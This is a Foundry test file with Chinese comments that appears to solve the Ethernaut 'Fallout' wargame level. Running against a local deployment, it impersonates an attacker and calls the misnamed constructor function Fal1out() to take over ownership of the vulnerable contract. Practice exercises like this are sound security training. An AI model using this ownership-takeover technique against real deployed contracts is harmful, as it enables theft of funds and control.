// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fal1out.sol";

contract Fal1outAttackTest is Test {
    Falllout public target;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // 部署合约，模拟真实环境
        target = new Falllout();
        // 给攻击者一点ETH
        vm.deal(attacker, 1 ether);
    }

    function test_attack() public {
        // 攻击者身份开始
        vm.startPrank(attacker);

        // 确认攻击前 owner 不是我们
        assertNotEq(target.owner(), attacker, "attack not started yet");

        // 第一步：来touch“Fal1out”
        target.Fal1out();

        // 确认已经夺舍 owner
        assertEq(target.owner(), attacker, "owner takeover failed");

        vm.stopPrank();

        console.log("Attack successful!");
    }
}
